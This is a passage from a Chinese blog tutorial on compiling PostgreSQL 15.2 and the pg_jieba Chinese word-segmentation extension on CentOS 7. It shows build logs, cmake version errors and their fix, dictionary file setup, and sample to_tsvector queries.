<li>对源码进行编译，这个过程稍微久一点</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gmake world</span><br><span class="line">...</span><br><span class="line">gmake -C vacuumlo all</span><br><span class="line">gmake[2]: Entering directory `/root/postgresql-15.2/contrib/vacuumlo&#x27;</span><br><span class="line">gcc -std=gnu99 -Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Werror=vla -Wendif-labels -Wmissing-format-attribute -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -O2 -I../../src/interfaces/libpq -I. -I. -I../../src/include  -D_GNU_SOURCE   -c -o vacuumlo.o vacuumlo.c</span><br><span class="line">gcc -std=gnu99 -Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Werror=vla -Wendif-labels -Wmissing-format-attribute -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -O2  vacuumlo.o -L../../src/common -lpgcommon -L../../src/port -lpgport -L../../src/interfaces/libpq -lpq -L../../src/port -L../../src/common   -Wl,--as-needed -Wl,-rpath,&#x27;/opt/pgsql-152/lib&#x27;,--enable-new-dtags   -lpgcommon -lpgport -lz -lreadline -lpthread -lrt -ldl -lm  -o vacuumlo</span><br><span class="line">gmake[2]: Leaving directory `/root/postgresql-15.2/contrib/vacuumlo&#x27;</span><br><span class="line">gmake[1]: Leaving directory `/root/postgresql-15.2/contrib&#x27;</span><br></pre></td></tr></table></figure></div>
<p>可以看到此时 pg 已经编译安装完成，查看安装路径，会发现生成了12个目录。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tree /opt/pgsql-152/ -L 2 -d</span></span><br><span class="line">/opt/pgsql-152/</span><br><span class="line">├── bin</span><br><span class="line">├── include</span><br><span class="line">│   ├── informix</span><br><span class="line">│   ├── internal</span><br><span class="line">│   ├── libpq</span><br><span class="line">│   └── server</span><br><span class="line">├── lib</span><br><span class="line">│   ├── pgxs</span><br><span class="line">│   └── pkgconfig</span><br><span class="line">└── share</span><br><span class="line">    ├── doc</span><br><span class="line">    └── man</span><br><span class="line"></span><br><span class="line">12 directories</span><br></pre></td></tr></table></figure></div>
<p>但是，插件并非安装在此目录，而是安装到了数据（data）目录，即编译时指定的<code>--datadir</code>路径。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># tree /data/pgdata-152/ -L 2 -d</span><br><span class="line">/data/pgdata-152/</span><br><span class="line">└── postgresql</span><br><span class="line">    ├── extension</span><br><span class="line">    ├── timezone</span><br><span class="line">    ├── timezonesets</span><br><span class="line">    └── tsearch_data</span><br><span class="line"></span><br><span class="line">5 directories</span><br></pre></td></tr></table></figure></div>
<p>对pg进行初始化，并启动pg，登录后，可以查看版本号，同时，可以看到编译时，自定义的版本信息 <code>(15.2-Yan)</code>。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">$ psql</span><br><span class="line">psql (<span class="number">15.2</span><span class="operator">-</span>Yan)</span><br><span class="line">Type &quot;help&quot; <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">postgres<span class="operator">=</span># <span class="keyword">select</span> version();</span><br><span class="line">                                                   version                                                   </span><br><span class="line"><span class="comment">-------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"> PostgreSQL <span class="number">15.2</span><span class="operator">-</span>Yan <span class="keyword">on</span> x86_64<span class="operator">-</span>pc<span class="operator">-</span>linux<span class="operator">-</span>gnu, compiled <span class="keyword">by</span> gcc (GCC) <span class="number">4.8</span><span class="number">.5</span> <span class="number">20150623</span> (Red Hat <span class="number">4.8</span><span class="number">.5</span><span class="number">-44</span>), <span class="number">64</span><span class="operator">-</span>bit</span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">postgres<span class="operator">=</span># \l</span><br><span class="line">                                                 List <span class="keyword">of</span> databases</span><br><span class="line">   Name    <span class="operator">|</span>  Owner   <span class="operator">|</span> Encoding <span class="operator">|</span>   <span class="keyword">Collate</span>   <span class="operator">|</span>    Ctype    <span class="operator">|</span> ICU Locale <span class="operator">|</span> Locale Provider <span class="operator">|</span>   Access privileges   </span><br><span class="line"><span class="comment">-----------+----------+----------+-------------+-------------+------------+-----------------+-----------------------</span></span><br><span class="line"> postgres  <span class="operator">|</span> postgres <span class="operator">|</span> UTF8     <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span>            <span class="operator">|</span> libc            <span class="operator">|</span> </span><br><span class="line"> template0 <span class="operator">|</span> postgres <span class="operator">|</span> UTF8     <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span>            <span class="operator">|</span> libc            <span class="operator">|</span> <span class="operator">=</span>c<span class="operator">/</span>postgres          <span class="operator">+</span></span><br><span class="line">           <span class="operator">|</span>          <span class="operator">|</span>          <span class="operator">|</span>             <span class="operator">|</span>             <span class="operator">|</span>            <span class="operator">|</span>                 <span class="operator">|</span> postgres<span class="operator">=</span>CTc<span class="operator">/</span>postgres</span><br><span class="line"> template1 <span class="operator">|</span> postgres <span class="operator">|</span> UTF8     <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span> en_US.UTF<span class="number">-8</span> <span class="operator">|</span>            <span class="operator">|</span> libc            <span class="operator">|</span> <span class="operator">=</span>c<span class="operator">/</span>postgres          <span class="operator">+</span></span><br><span class="line">           <span class="operator">|</span>          <span class="operator">|</span>          <span class="operator">|</span>             <span class="operator">|</span>             <span class="operator">|</span>            <span class="operator">|</span>                 <span class="operator">|</span> postgres<span class="operator">=</span>CTc<span class="operator">/</span>postgres</span><br><span class="line">(<span class="number">3</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line">postgres<span class="operator">=</span># \conninfo</span><br><span class="line">You <span class="keyword">are</span> connected <span class="keyword">to</span> database &quot;postgres&quot; <span class="keyword">as</span> <span class="keyword">user</span> &quot;postgres&quot; via socket <span class="keyword">in</span> &quot;/tmp&quot; <span class="keyword">at</span> port &quot;5432&quot;.</span><br><span class="line"></span><br><span class="line">postgres<span class="operator">=</span># </span><br></pre></td></tr></table></figure></div>
<h2 id="编译安装-pg-jieba">编译安装 pg_jieba</h2>
<p>pg_jieba 的源码路径为 <a class="link"   href="https://github.com/jaiminpan/pg_jieba/" >https://github.com/jaiminpan/pg_jieba/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
由于 github 网络限制，我已镜像到 gitee： <a class="link"   href="https://gitee.com/shawnyan/pg_jieba" >https://gitee.com/shawnyan/pg_jieba <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>代码的 readme 中显示该插件支持 postgresql 9.x, postgresql 10.x, postgresql 11.x<br>
该插件需要确保 postgresql 已经安装，并可运行 <code>pg_config</code> 命令。</p>
<p>另外，该插件源码依赖另一个项目 – <strong>cppjieba</strong><br>
CppJieba是&quot;结巴(Jieba)&quot;中文分词的C++版本<br>
该项目支持utf8编码。支持载自定义用户词典，多路径时支持分隔符’|‘或者’;'分隔。</p>
<p>但依赖：</p>
<ul>
<li>g++ (version &gt;= 4.1 is recommended) or clang++;</li>
<li>cmake (version &gt;= 2.6 is recommended);</li>
</ul>
<p>这里留个伏笔，虽然 readme 中标记为推荐使用 cmake 2.6，但实际编译时这里就有问题。<br>
如下图，编译时报错：</p>
<ol>
<li>提示 foreach 不支持</li>
<li>需要使用 c99 标准进行编译源码。</li>
</ol>
<img  alt="pg-jieba-make.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230301-df73c84f-3688-45ac-ad6d-dfe521d2b974.png"
                      referrerpolicy="no-referrer"
                >
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 build]# cmake .. -DCMAKE_PREFIX_PATH=/opt/pgsql-152/</span><br><span class="line">-- Setting pg_jieba build type - </span><br><span class="line">-- Found PostgreSQL: /opt/pgsql-152/lib (found version &quot;15.2-Yan&quot;) </span><br><span class="line">-- PostgreSQL include dirs: /opt/pgsql-152/include;/opt/pgsql-152/include/server</span><br><span class="line">-- PostgreSQL library dirs: /opt/pgsql-152/lib</span><br><span class="line">-- PostgreSQL libraries:    pq</span><br><span class="line">-- POSTGRESQL_EXECUTABLE is /opt/pgsql-152/bin/postgres</span><br><span class="line">-- Configuring done</span><br><span class="line">-- Generating done</span><br><span class="line">-- Build files have been written to: /root/postgresql-15.2/contrib/pg_jieba/build</span><br><span class="line">[root@centos7 build]# </span><br><span class="line"></span><br><span class="line">[root@centos7 build]# make</span><br><span class="line">Scanning dependencies of target pg_jieba</span><br><span class="line">[ 50%] Building C object CMakeFiles/pg_jieba.dir/pg_jieba.c.o</span><br><span class="line">/root/postgresql-15.2/contrib/pg_jieba/pg_jieba.c:258:1: warning: ‘DefineCustomConfigVariables’ was used with no prototype before its definition [-Wmissing-prototypes]</span><br><span class="line"> DefineCustomConfigVariables()</span><br><span class="line"> ^</span><br><span class="line">In file included from /opt/pgsql-152/include/server/nodes/primnodes.h:22:0,</span><br><span class="line">                 from /opt/pgsql-152/include/server/nodes/parsenodes.h:27,</span><br><span class="line">                 from /opt/pgsql-152/include/server/utils/guc.h:16,</span><br><span class="line">                 from /root/postgresql-15.2/contrib/pg_jieba/pg_jieba.c:17:</span><br><span class="line">/root/postgresql-15.2/contrib/pg_jieba/pg_jieba.c: In function ‘extract_dict_list’:</span><br><span class="line">/opt/pgsql-152/include/server/nodes/pg_list.h:353:2: error: ‘for’ loop initial declarations are only allowed in C99 mode</span><br><span class="line">  for (ForEachState cell##__state = &#123;(lst), 0&#125;; \</span><br><span class="line">  ^</span><br><span class="line">/root/postgresql-15.2/contrib/pg_jieba/pg_jieba.c:459:2: note: in expansion of macro ‘foreach’</span><br><span class="line">  foreach(lc, elemlist)</span><br><span class="line">  ^</span><br><span class="line">/opt/pgsql-152/include/server/nodes/pg_list.h:353:2: note: use option -std=c99 or -std=gnu99 to compile your code</span><br><span class="line">  for (ForEachState cell##__state = &#123;(lst), 0&#125;; \</span><br><span class="line">  ^</span><br><span class="line">/root/postgresql-15.2/contrib/pg_jieba/pg_jieba.c:459:2: note: in expansion of macro ‘foreach’</span><br><span class="line">  foreach(lc, elemlist)</span><br><span class="line">  ^</span><br><span class="line">make[2]: *** [CMakeFiles/pg_jieba.dir/pg_jieba.c.o] Error 1</span><br><span class="line">make[1]: *** [CMakeFiles/pg_jieba.dir/all] Error 2</span><br><span class="line">make: *** [all] Error 2</span><br><span class="line">[root@centos7 build]# </span><br></pre></td></tr></table></figure></div>
<h3 id="编译安装-limonp">编译安装 limonp</h3>
<p>翻阅源码，发现 pg_jieba 依赖于 deps/<strong>limonp</strong>，然而 limonp 也有依赖 cppjieba，那么我们就先跳过这步，直接编译 cppjieba，从最里层开始尝试编译。</p>
<p>&lt;-- 此处先跳转到下一节 --&gt;</p>
<p>代码中显示编译至少要使用 <strong>cmake3</strong><sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> 以上版本，症结找到了，版本很重要，文档也很重要。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION <span class="number">3.0</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="编译安装-cppjieba">编译安装 cppjieba</h3>
<p>剥“洋葱”是个有趣的过程，继续翻代码，可以发现 limonp 依赖于 cppjieba。<br>
那么按照惯性，cppjieba也不可能一次编译成功了。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ 16%] Building CXX object test/CMakeFiles/demo.dir/demo.cpp.o</span><br><span class="line">In file included from /root/cppjieba/include/cppjieba/QuerySegment.hpp:7:0,</span><br><span class="line">                 from /root/cppjieba/include/cppjieba/Jieba.hpp:4,</span><br><span class="line">                 from /root/cppjieba/test/demo.cpp:1:</span><br><span class="line">/root/cppjieba/deps/limonp/include/limonp/Logging.hpp:56:5: warning: identifier ‘nullptr’ is a keyword in C++11 [-Wc++0x-compat]</span><br><span class="line">     assert(tm_tmp != nullptr);</span><br><span class="line">     ^</span><br><span class="line">In file included from /usr/include/c++/4.8.2/cassert:43:0,</span><br><span class="line">                 from /root/cppjieba/deps/limonp/include/limonp/Logging.hpp:6,</span><br><span class="line">                 from /root/cppjieba/include/cppjieba/QuerySegment.hpp:7,</span><br><span class="line">                 from /root/cppjieba/include/cppjieba/Jieba.hpp:4,</span><br><span class="line">                 from /root/cppjieba/test/demo.cpp:1:</span><br><span class="line">/root/cppjieba/deps/limonp/include/limonp/Logging.hpp: In constructor ‘limonp::Logger::Logger(size_t, const char*, int)’:</span><br><span class="line">/root/cppjieba/deps/limonp/include/limonp/Logging.hpp:56:22: error: ‘nullptr’ was not declared in this scope</span><br><span class="line">     assert(tm_tmp != nullptr);</span><br><span class="line">                      ^</span><br></pre></td></tr></table></figure></div>
<p>果然，那么问题到底出在哪里了呢。<br>
<strong>root cause 是在 cmake 的版本。</strong></p>
<p>果然，在安装 cmake3 之后，重新编译便可以通过。</p>
<ul>
<li>output:</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 build]# cmake3 . -DCMAKE_CXX_STANDARD=11 .. </span><br><span class="line">-- The C compiler identification is GNU 4.8.5</span><br><span class="line">-- The CXX compiler identification is GNU 4.8.5</span><br><span class="line">-- Check for working C compiler: /usr/bin/cc</span><br><span class="line">-- Check for working C compiler: /usr/bin/cc - works</span><br><span class="line">-- Detecting C compiler ABI info</span><br><span class="line">-- Detecting C compiler ABI info - done</span><br><span class="line">-- Detecting C compile features</span><br><span class="line">-- Detecting C compile features - done</span><br><span class="line">-- Check for working CXX compiler: /usr/bin/c++</span><br><span class="line">-- Check for working CXX compiler: /usr/bin/c++ - works</span><br><span class="line">-- Detecting CXX compiler ABI info</span><br><span class="line">-- Detecting CXX compiler ABI info - done</span><br><span class="line">-- Detecting CXX compile features</span><br><span class="line">-- Detecting CXX compile features - done</span><br><span class="line">-- Configuring done</span><br><span class="line">-- Generating done</span><br><span class="line">-- Build files have been written to: /root/cppjieba/build</span><br><span class="line">[root@centos7 build]# make</span><br><span class="line">Scanning dependencies of target gtest</span><br><span class="line">[  6%] Building CXX object deps/gtest/CMakeFiles/gtest.dir/src/gtest-all.cc.o</span><br><span class="line">[ 12%] Linking CXX static library libgtest.a</span><br><span class="line">[ 12%] Built target gtest</span><br><span class="line">Scanning dependencies of target load_test</span><br><span class="line">[ 18%] Building CXX object test/CMakeFiles/load_test.dir/load_test.cpp.o</span><br><span class="line">[ 25%] Linking CXX executable ../load_test</span><br><span class="line">[ 25%] Built target load_test</span><br><span class="line">Scanning dependencies of target demo</span><br><span class="line">[ 31%] Building CXX object test/CMakeFiles/demo.dir/demo.cpp.o</span><br><span class="line">[ 37%] Linking CXX executable ../demo</span><br><span class="line">[ 37%] Built target demo</span><br><span class="line">Scanning dependencies of target test.run</span><br><span class="line">[ 43%] Building CXX object test/unittest/CMakeFiles/test.run.dir/gtest_main.cpp.o</span><br><span class="line">[ 50%] Building CXX object test/unittest/CMakeFiles/test.run.dir/keyword_extractor_test.cpp.o</span><br><span class="line">[ 56%] Building CXX object test/unittest/CMakeFiles/test.run.dir/trie_test.cpp.o</span><br><span class="line">[ 62%] Building CXX object test/unittest/CMakeFiles/test.run.dir/segments_test.cpp.o</span><br><span class="line">[ 68%] Building CXX object test/unittest/CMakeFiles/test.run.dir/pos_tagger_test.cpp.o</span><br><span class="line">[ 75%] Building CXX object test/unittest/CMakeFiles/test.run.dir/jieba_test.cpp.o</span><br><span class="line">[ 81%] Building CXX object test/unittest/CMakeFiles/test.run.dir/pre_filter_test.cpp.o</span><br><span class="line">[ 87%] Building CXX object test/unittest/CMakeFiles/test.run.dir/unicode_test.cpp.o</span><br><span class="line">[ 93%] Building CXX object test/unittest/CMakeFiles/test.run.dir/textrank_test.cpp.o</span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Linking CXX executable ../test.run</span></span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target test.run</span></span><br><span class="line">[root@centos7 build]# ls</span><br><span class="line">CMakeCache.txt  CMakeFiles  cmake_install.cmake  CTestTestfile.cmake  demo  deps  load_test  Makefile  test</span><br><span class="line">[root@centos7 build]# ./demo </span><br><span class="line">他来到了网易杭研大厦</span><br><span class="line">[demo] Cut With HMM</span><br><span class="line">他/来到/了/网易/杭研/大厦</span><br><span class="line">[demo] Cut Without HMM </span><br><span class="line">他/来到/了/网易/杭/研/大厦</span><br><span class="line">我来到北京清华大学</span><br><span class="line">[demo] CutAll</span><br><span class="line">我/来到/北京/清华/清华大学/华大/大学</span><br><span class="line">小明硕士毕业于中国科学院计算所，后在日本京都大学深造</span><br><span class="line">[demo] CutForSearch</span><br><span class="line">小明/硕士/毕业/于/中国/科学/学院/科学院/中国科学院/计算/计算所/，/后/在/日本/京都/大学/日本京都大学/深造</span><br><span class="line">[demo] Insert User Word</span><br><span class="line">男默/女泪</span><br><span class="line">男默女泪</span><br><span class="line">[demo] CutForSearch Word With Offset</span><br><span class="line">[&#123;&quot;word&quot;: &quot;小明&quot;, &quot;offset&quot;: 0&#125;, &#123;&quot;word&quot;: &quot;硕士&quot;, &quot;offset&quot;: 6&#125;, &#123;&quot;word&quot;: &quot;毕业&quot;, &quot;offset&quot;: 12&#125;, &#123;&quot;word&quot;: &quot;于&quot;, &quot;offset&quot;: 18&#125;, &#123;&quot;word&quot;: &quot;中国&quot;, &quot;offset&quot;: 21&#125;, &#123;&quot;word&quot;: &quot;科学&quot;, &quot;offset&quot;: 27&#125;, &#123;&quot;word&quot;: &quot;学院&quot;, &quot;offset&quot;: 30&#125;, &#123;&quot;word&quot;: &quot;科学院&quot;, &quot;offset&quot;: 27&#125;, &#123;&quot;word&quot;: &quot;中国科学院&quot;, &quot;offset&quot;: 21&#125;, &#123;&quot;word&quot;: &quot;计算&quot;, &quot;offset&quot;: 36&#125;, &#123;&quot;word&quot;: &quot;计算所&quot;, &quot;offset&quot;: 36&#125;, &#123;&quot;word&quot;: &quot;，&quot;, &quot;offset&quot;: 45&#125;, &#123;&quot;word&quot;: &quot;后&quot;, &quot;offset&quot;: 48&#125;, &#123;&quot;word&quot;: &quot;在&quot;, &quot;offset&quot;: 51&#125;, &#123;&quot;word&quot;: &quot;日本&quot;, &quot;offset&quot;: 54&#125;, &#123;&quot;word&quot;: &quot;京都&quot;, &quot;offset&quot;: 60&#125;, &#123;&quot;word&quot;: &quot;大学&quot;, &quot;offset&quot;: 66&#125;, &#123;&quot;word&quot;: &quot;日本京都大学&quot;, &quot;offset&quot;: 54&#125;, &#123;&quot;word&quot;: &quot;深造&quot;, &quot;offset&quot;: 72&#125;]</span><br><span class="line">[demo] Lookup Tag for Single Token</span><br><span class="line">[拖拉机:n, CEO:eng, 123:m, 。:x]</span><br><span class="line">[demo] Tagging</span><br><span class="line">我是拖拉机学院手扶拖拉机专业的。不用多久，我就会升职加薪，当上CEO，走上人生巅峰。</span><br><span class="line">[我:r, 是:v, 拖拉机:n, 学院:n, 手扶拖拉机:n, 专业:n, 的:uj, 。:x, 不用:v, 多久:m, ，:x, 我:r, 就:d, 会:v, 升职:v, 加薪:nr, ，:x, 当上:t, CEO:eng, ，:x, 走上:v, 人生:n, 巅峰:n, 。:x]</span><br><span class="line">[demo] Keyword Extraction</span><br><span class="line">我是拖拉机学院手扶拖拉机专业的。不用多久，我就会升职加薪，当上CEO，走上人生巅峰。</span><br><span class="line">[&#123;&quot;word&quot;: &quot;CEO&quot;, &quot;offset&quot;: [93], &quot;weight&quot;: 11.7392&#125;, &#123;&quot;word&quot;: &quot;升职&quot;, &quot;offset&quot;: [72], &quot;weight&quot;: 10.8562&#125;, &#123;&quot;word&quot;: &quot;加薪&quot;, &quot;offset&quot;: [78], &quot;weight&quot;: 10.6426&#125;, &#123;&quot;word&quot;: &quot;手扶拖拉机&quot;, &quot;offset&quot;: [21], &quot;weight&quot;: 10.0089&#125;, &#123;&quot;word&quot;: &quot;巅峰&quot;, &quot;offset&quot;: [111], &quot;weight&quot;: 9.49396&#125;]</span><br><span class="line">[root@centos7 build]# </span><br></pre></td></tr></table></figure></div>
<h3 id="完整编译过程">完整编译过程</h3>
<p>下载源码：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root/postgresql-15.2/contrib</span><br><span class="line">git clone https://gitee.com/shawnyan/pg_jieba --depth=1</span><br><span class="line">git clone https://gitee.com/shawnyan/cppjieba --depth=1 pg_jieba/libjieba</span><br><span class="line">git clone https://gitee.com/shawnyan/limonp --depth=1 pg_jieba/libjieba/deps/limonp</span><br></pre></td></tr></table></figure></div>
<p>编译：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd pg_jieba</span><br><span class="line">vi CMakeLists.txt</span><br><span class="line">set(CMAKE_C_STANDARD 99)</span><br><span class="line"></span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line"></span><br><span class="line">cmake3 -DCMAKE_PREFIX_PATH=/opt/pgsql-152/ ..</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>
<ul>
<li>output:</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- The C compiler identification is GNU 4.8.5</span><br><span class="line">-- The CXX compiler identification is GNU 4.8.5</span><br><span class="line">-- Check for working C compiler: /usr/bin/cc</span><br><span class="line">-- Check for working C compiler: /usr/bin/cc - works</span><br><span class="line">-- Detecting C compiler ABI info</span><br><span class="line">-- Detecting C compiler ABI info - done</span><br><span class="line">-- Detecting C compile features</span><br><span class="line">-- Detecting C compile features - done</span><br><span class="line">-- Check for working CXX compiler: /usr/bin/c++</span><br><span class="line">-- Check for working CXX compiler: /usr/bin/c++ - works</span><br><span class="line">-- Detecting CXX compiler ABI info</span><br><span class="line">-- Detecting CXX compiler ABI info - done</span><br><span class="line">-- Detecting CXX compile features</span><br><span class="line">-- Detecting CXX compile features - done</span><br><span class="line">-- Setting pg_jieba build type - </span><br><span class="line">-- Found PostgreSQL: /opt/pgsql-152/lib/libpq.so (found version &quot;15.2&quot;) </span><br><span class="line">-- POSTGRESQL_EXECUTABLE is /opt/pgsql-152/bin/postgres</span><br><span class="line">-- Configuring done</span><br><span class="line">-- Generating done</span><br><span class="line">-- Build files have been written to: /root/postgresql-15.2/contrib/pg_jieba/build</span><br><span class="line"></span><br><span class="line">[root@centos7 build]# make</span><br><span class="line">Scanning dependencies of target pg_jieba</span><br><span class="line">[ 33%] Building C object CMakeFiles/pg_jieba.dir/pg_jieba.c.o</span><br><span class="line">/root/postgresql-15.2/contrib/pg_jieba/pg_jieba.c:258:1: warning: ‘DefineCustomConfigVariables’ was used with no prototype before its definition [-Wmissing-prototypes]</span><br><span class="line"> DefineCustomConfigVariables()</span><br><span class="line"> ^</span><br><span class="line">[ 66%] Building CXX object CMakeFiles/pg_jieba.dir/jieba.cpp.o</span><br><span class="line">[100%] Linking CXX shared library pg_jieba.so</span><br><span class="line">[100%] Built target pg_jieba</span><br><span class="line">[root@centos7 build]# ll</span><br><span class="line">total 684</span><br><span class="line">-rw-r--r-- 1 root root  15772 Mar  1 00:28 CMakeCache.txt</span><br><span class="line">drwxr-xr-x 5 root root    283 Mar  1 00:28 CMakeFiles</span><br><span class="line">-rw-r--r-- 1 root root   7779 Mar  1 00:28 cmake_install.cmake</span><br><span class="line">-rw-r--r-- 1 root root   7961 Mar  1 00:28 Makefile</span><br><span class="line">-rwxr-xr-x 1 root root 666720 Mar  1 00:28 pg_jieba.so  --------------  </span><br><span class="line">[root@centos7 build]# cp pg_jieba.so /opt/pgsql-152/lib</span><br></pre></td></tr></table></figure></div>
<h3 id="安装-pg-jieba-插件">安装 pg_jieba 插件</h3>
<p>启动 pg 服务之前，先在配置文件中添加预加载。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vi postgresql.conf</span><br><span class="line">shared_preload_libraries = &#x27;pg_jieba&#x27;</span><br></pre></td></tr></table></figure></div>
<p>其次，需要复制辅助文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cp pg_jieba/libjieba/dict/jieba.dict.utf8 /data/pgdata-152/postgresql/tsearch_data/jieba_base.dict</span><br><span class="line">cp pg_jieba/libjieba/dict/user.dict.utf8 /data/pgdata-152/postgresql/tsearch_data/jieba_user.dict</span><br><span class="line">cp pg_jieba/libjieba/dict/hmm_model.utf8 /data/pgdata-152/postgresql/tsearch_data/jieba_hmm.model</span><br><span class="line">cp pg_jieba/libjieba/dict/stop_words.utf8 /data/pgdata-152/postgresql/tsearch_data/jieba.stop</span><br><span class="line">cp pg_jieba/pg_jieba.control /data/pgdata-152/postgresql/extension/pg_jieba.control</span><br><span class="line">cp pg_jieba/pg_jieba.sql /data/pgdata-152/postgresql/extension/pg_jieba--1.1.1.sql</span><br></pre></td></tr></table></figure></div>
<p>启动 pg 服务后，便可正常安装使用 pg_jieba 插件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@centos7 ~]$ pg_ctl start</span><br><span class="line">pg_ctl: another server might be running; trying to start server anyway</span><br><span class="line">waiting for server to start.....2023-03-01 00:44:13.044 CST [49163] LOG:  starting PostgreSQL 15.2-Yan on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44), 64-bit</span><br><span class="line">2023-03-01 00:44:13.045 CST [49163] LOG:  listening on IPv6 address &quot;::1&quot;, port 5432</span><br><span class="line">2023-03-01 00:44:13.045 CST [49163] LOG:  listening on IPv4 address &quot;127.0.0.1&quot;, port 5432</span><br><span class="line">2023-03-01 00:44:13.048 CST [49163] LOG:  listening on Unix socket &quot;/tmp/.s.PGSQL.5432&quot;</span><br><span class="line">2023-03-01 00:44:13.058 CST [49166] LOG:  database system was shut down at 2023-02-28 22:40:27 CST</span><br><span class="line">2023-03-01 00:44:13.063 CST [49163] LOG:  database system is ready to accept connections</span><br><span class="line"> done</span><br><span class="line">server started</span><br><span class="line">[postgres@centos7 ~]$ </span><br><span class="line">[postgres@centos7 ~]$ psql</span><br><span class="line">psql (15.2-Yan)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# CREATE EXTENSION pg_jieba;</span><br><span class="line">CREATE EXTENSION</span><br><span class="line">postgres=# </span><br><span class="line">postgres=# \dx</span><br><span class="line">                        List of installed extensions</span><br><span class="line">   Name   | Version |   Schema   |               Description                </span><br><span class="line">----------+---------+------------+------------------------------------------</span><br><span class="line"> pg_jieba | 1.1.1   | public     | a parser for full-text search of Chinese</span><br><span class="line"> plpgsql  | 1.0     | pg_catalog | PL/pgSQL procedural language</span><br><span class="line">(2 rows)</span><br></pre></td></tr></table></figure></div>
<p>最后，实测 pg_jieba 插件，效果如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">postgres<span class="operator">=</span># <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> to_tsvector(<span class="string">&#x27;jiebacfg&#x27;</span>, <span class="string">&#x27;小明硕士毕业于中国科学院计算所，后在PGCCC学习PostgreSQL&#x27;</span>);</span><br><span class="line">                                        to_tsvector                                        </span><br><span class="line"><span class="comment">-------------------------------------------------------------------------------------------</span></span><br><span class="line"> <span class="string">&#x27;pgccc&#x27;</span>:<span class="number">10</span> <span class="string">&#x27;postgresql&#x27;</span>:<span class="number">12</span> <span class="string">&#x27;中国科学院&#x27;</span>:<span class="number">5</span> <span class="string">&#x27;学习&#x27;</span>:<span class="number">11</span> <span class="string">&#x27;小明&#x27;</span>:<span class="number">1</span> <span class="string">&#x27;毕业&#x27;</span>:<span class="number">3</span> <span class="string">&#x27;硕士&#x27;</span>:<span class="number">2</span> <span class="string">&#x27;计算所&#x27;</span>:<span class="number">6</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">postgres<span class="operator">=</span># <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> to_tsvector(<span class="string">&#x27;jiebacfg&#x27;</span>, <span class="string">&#x27;小丽是个潜水王，也是数据库方面的专家&#x27;</span>);</span><br><span class="line">                       to_tsvector                       </span><br><span class="line"><span class="comment">---------------------------------------------------------</span></span><br><span class="line"> <span class="string">&#x27;专家&#x27;</span>:<span class="number">12</span> <span class="string">&#x27;小丽&#x27;</span>:<span class="number">1</span> <span class="string">&#x27;数据库&#x27;</span>:<span class="number">9</span> <span class="string">&#x27;方面&#x27;</span>:<span class="number">10</span> <span class="string">&#x27;潜水&#x27;</span>:<span class="number">4</span> <span class="string">&#x27;王&#x27;</span>:<span class="number">5</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
